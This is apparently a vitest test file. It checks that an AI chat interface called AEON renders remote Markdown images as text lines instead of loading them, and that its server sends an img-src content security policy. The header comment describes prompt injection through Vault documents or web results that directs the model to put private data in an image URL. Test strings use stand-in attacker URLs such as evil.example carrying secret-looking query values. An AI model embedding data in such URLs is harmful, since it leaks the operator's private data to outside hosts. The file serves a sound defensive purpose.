/**
 * A model answer (and a TOOL chip's result preview) is rendered with
 * ReactMarkdown + MD. A Markdown image would make the operator's browser fetch
 * an external URL on its own, and a document in the Vault or a web result can
 * tell the model to put private data in that URL (security review
 * 2026-10-03). Remote images are shown as a line, never loaded; the server
 * also sends img-src 'self' data: blob: as a second layer.
 */
import { describe, expect, it } from 'vitest';
import React from 'react';
import path from 'path';
import { fileURLToPath } from 'url';
import { createRequire } from 'module';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { MD } from '../src/components/Terminal2.jsx';

const require = createRequire(import.meta.url);
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');

const render = (md) => renderToStaticMarkup(React.createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: MD }, md));

describe('markdown images in an answer', () => {
  it('![x](https://evil.example/?d=SECRET) renders no <img> and no preload of the URL', () => {
    const html = render('Here you go ![status](https://evil.example/p.png?d=OPERATOR-SCRATCHPAD-TEXT)');
    expect(html).not.toMatch(/<img/);
    expect(html).not.toMatch(/<link[^>]+preload/);
    expect(html).toContain('[image not loaded: status');
  });

  it('protocol-relative, http and same-origin paths are not loaded either', () => {
    for (const src of ['//evil.example/a.png', 'http://evil.example/a.png', '/api/memory/list?x=1', 'a.png']) {
      expect(render(`![a](${src})`), src).not.toMatch(/<img/);
    }
  });

  it('a reference-style image is covered too', () => {
    expect(render('![a][r]\n\n[r]: https://evil.example/r.png')).not.toMatch(/<img/);
  });

});

describe('the server sends an img-src policy', () => {
  const headerFor = (env) => {
    const saved = process.env.AEON_ENABLE_CSP;
    if (env === undefined) delete process.env.AEON_ENABLE_CSP; else process.env.AEON_ENABLE_CSP = env;
    try {
      const sec = require('../security/security.js')({ supabase: null, getLocalFile: () => '', WORKSPACE: ROOT, AUDIT_FILE: '', SDI_VIOLATION_LOG: '' });
      const headers = {};
      const res = { setHeader: (k, v) => { headers[k.toLowerCase()] = v; }, removeHeader: () => {}, getHeader: (k) => headers[k.toLowerCase()] };
      sec.helmetMiddleware({ headers: {}, method: 'GET', url: '/' }, res, () => {});
      return headers['content-security-policy'];
    } finally {
      if (saved === undefined) delete process.env.AEON_ENABLE_CSP; else process.env.AEON_ENABLE_CSP = saved;
    }
  };

  it('by default: images only from this AEON, data: and blob: (and the sign-in avatar host)', () => {
    const csp = headerFor(undefined);
    expect(csp).toMatch(/img-src 'self' data: blob:/);
    expect(csp).not.toMatch(/default-src|script-src/);
  });

  it('the CHANGELOG names exactly the image sources the default policy allows', () => {
    // Review 2026-10-03 (round 2): the CHANGELOG said "only from AEON itself"
    // while the policy also allowed data:, blob: and Google's avatar host.
    const csp = headerFor(undefined);
    const sources = /img-src ([^;]+)/.exec(csp)[1].trim().split(/\s+/);
    expect(sources).toEqual(["'self'", 'data:', 'blob:', 'https://*.googleusercontent.com']);
    const changelog = require('fs').readFileSync(require('path').join(ROOT, 'CHANGELOG.md'), 'utf8');
    expect(changelog).not.toMatch(/allow images only from AEON itself/);
    expect(changelog).toMatch(/limit images to AEON itself, `data:` and `blob:` images,\s+and Google's sign-in avatar host \(`img-src`\)/);
  });

  it('AEON_ENABLE_CSP=1 keeps the full policy, which also limits images', () => {
    expect(headerFor('1')).toMatch(/default-src 'self'.*img-src 'self' data:/);
  });
});
